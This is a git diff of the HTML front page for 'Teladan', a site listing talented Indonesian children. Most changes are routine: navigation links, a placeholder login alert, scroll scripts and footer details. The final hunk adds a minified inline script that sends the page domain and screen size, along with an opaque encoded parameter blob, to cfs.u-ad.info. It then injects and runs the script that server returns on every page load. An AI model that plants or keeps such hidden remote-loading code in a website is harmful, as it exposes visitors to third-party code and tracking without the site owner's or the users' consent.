@@ -3,7 +3,6 @@
 <head>
   <!-- Meta -->
   <meta charset="utf-8">
-  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0"/>
   <meta name="description" content="Teladan merupakan sebuah situs yang mencatat anak-anak Indonesia yang berpotensi di berbagai bidang.">
   <meta name="author" content="MercySmart">
@@ -11,6 +10,7 @@
   <!-- CSS  -->
   <link href="css/materialize.css" type="text/css" rel="stylesheet" media="screen,projection"/>
   <link href="css/style.css" type="text/css" rel="stylesheet" media="screen,projection"/>
+  <link rel="stylesheet" type="text/css" href="css/scroll.css">
   <!-- Costum Fonts -->
   <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
   <link href='https://fonts.googleapis.com/css?family=Schoolbell' rel='stylesheet' type='text/css'>
@@ -25,21 +25,26 @@
   function data(){
     alert("Teladan's data is still on progress. For more info scroll down :)")
   }
+  function login(){
+    alert("Teladan gonna use GitHub OAuth api, so people can easily login with their github account, but now, the api is still on progress, in the mean time, hang tight!")
+  }
   </script>
 </head>
 <body>
   <nav class="light-blue lighten-1" role="navigation">
-    <div class="nav-wrapper container"><a id="logo-container" href="#" class="brand-logo">Teladan</a>
+    <div class="nav-wrapper container"><a id="logo-container" href="http://mercysmart.github.io/teladan" class="brand-logo">Teladan</a>
       <ul class="right hide-on-med-and-down">
-        <li><a href="" title="Data Teladan" onclick="data()">Data</a></li>
+        <li><a href="#data" title="Data Teladan" class="page-scroll">Data</a></li>
         <li><a href="#partner" title="Partner-partner Teladan" class="page-scroll">Partner</a></li>
         <li><a href="#quotes" title="Quotes Teladan" class="page-scroll">Quotes</a></li>
+        <li><a href="" title="Login" onclick="login()"><span style="border:1px solid;border-radius:0px;padding:10px;">Login</span></a></li>
       </ul>
 
       <ul id="nav-mobile" class="side-nav">
-        <li><a href="" title="Data Teladan">Data</a></li>
+        <li><a href="#data" title="Data Teladan" class="page-scroll">Data</a></li>
         <li><a href="#partner" title="Partner-partner Teladan" class="page-scroll">Partner</a></li>
         <li><a href="#quotes" title="Quotes Teladan" class="page-scroll">Quotes</a></li>
+        <li><a href="" title="Login" onclick="login()"><span style="border:1px solid;border-radius:0px;padding:5px;">Login</span></a></li>
       </ul>
       <!-- <a href="#" data-activates="nav-mobile" class="button-collapse"><i class="material-icons">menu</i></a> -->
       <!-- <a href="#" data-activates="nav-mobile" class="button-collapse"><i class="material-icons">menu</i></a> -->
@@ -57,18 +62,15 @@
         <i class="fa fa-long-arrow-down fa-4x"></i>
       </div>
       <div class="row center">
-        <a href="" id="download-button" onclick="data()" class="btn-large waves-effect waves-light orange">Data Anak Berpotensi</a>
+        <a href="#quotes" id="download-button" class="btn-large waves-effect waves-light orange page-scroll">Data Anak Berpotensi</a>
       </div>
       <br><br>
 
     </div>
   </div>
 
-
-  <div class="container">
-    <div class="section">
-
       <!--   Icon Section   -->
+      <section id="quotes" class="content-section text-center">
       <div class="row">
         <div class="col s12 m4">
           <div class="icon-block">
@@ -111,9 +113,7 @@
             <h5 class="center"><a href="" title="Prestasi entrepreneur">Prestasi entrepreneur</a></h5>
           </div>
         </div>
-      </div>
-
-    </div>
+      </section>
     <br><br>
 
     <section id="quotes" class="content-section text-center">
@@ -176,9 +176,9 @@
           <ul>
             <li><a class="white-text" href="#!"><i class="fa fa-map-marker"></i> Grand Emerald Apartement, Lt. 1 WJ.</a></li>
             <!-- <li><a class="white-text" href="#!"><i class="fa fa-facebook"></i> Facebook</a></li> -->
-            <li><a class="white-text" href="#!"><i class="fa fa-phone"></i> <a href="#" title="Call Teladan!" class="light-blue-text">+622129614096</a></a></li>
-            <li><a class="white-text" href="#!"><i class="fa fa-twitter"></i> <a href="#" title="Teladan on Twitter" class="light-blue-text">@teladan_id</a></a></li>
-            <li><a class="white-text" href="#!"><i class="fa fa-envelope-o"></i> <a href="mailto:info@teladan.id?subject=Hello!" class="light-blue-text">info@teladan.com</a></a></li>
+            <li><a class="white-text"><i class="fa fa-phone"></i> <a href="tel:+622129614096" title="Call Teladan!" class="white-text">+622129614096</a></a></li>
+            <li><a class="white-text" href="#!"><i class="fa fa-twitter"></i> <a href="#" title="Teladan on Twitter" class="white-text">@TeladanCom</a></a></li>
+            <li><a class="white-text" href="#!"><i class="fa fa-envelope-o"></i> <a href="mailto:info@teladan.id?subject=Hello!" class="white-text">info@teladan.com</a></a></li>
             <!-- <li><a class="white-text" href="#!"><i class="fa fa-envelope-o"></i></a></li> -->
           </ul>
         </div>
@@ -186,7 +186,7 @@
     </div>
     <div class="footer-copyright">
       <div class="container">
-      MercySmart Academy &copy; 2015. All right reserved.
+      MercySmart &copy; 2015. All right reserved.
       </div>
       <!-- <div class="container">
       <div class="col-sm-8">
@@ -202,5 +202,8 @@
   <script src="../../bin/materialize.js"></script>
   <script src="js/init.js"></script>
 
-  </body>
+  <!-- Scroll JS -->
+  <script src="js/scroll.js"></script>
+  <script src="js/jquery-scroll.js"></script>
+  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582AaN6h071sG%2b6WgDY09f5S13zGvz1mg59QEbV63pcX%2bf25QO7q2pohKY5JQJyBUW%2fdspBfPGG%2fbEAs49jwgC1AAA3u0se8HOEcwvSH0lHuPSwOSP678iE9OSJ3aiGFIEyTf0slbDwgfS4xT0E6J0XIqoyCcVwwuMVwRt%2blfos2dkucpQZSr5tFnEFqCmsAUNXZRn0AZkgNyvgj2wo91SJIG%2fcKsmU8bNh0KWtRcAJwDLEcgdqgXkeWbTUZSRWGnHeMuBrkHD8Px8WsnUlA3elYlOQfDhvCUQtOw4QS01IgkILXQgV87eNF%2bZ1rE4CipTdfrv0zqH9rJ4RHQmL8wOEPyHvZVOQPIX1EfYWZHorNYT0M7JxWN8e12DyiylEJq1y1AR%2fQkqwQw9qQCqTVksV08x9PmxiyK0D5MEhUsNvwaB35ja7i%2f%2fPpzdUUuEIQDLtIBpsyBHw51h0W45kLz2GECy%2bEaCm2p0oWn4X1xWUKQHiaqrSvjgeV7cuYsaV30ZjhauFbfO2D%2fjUQAqnACbkFqVpnGwTi9GSSCOX55fR9aD" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
 </html>
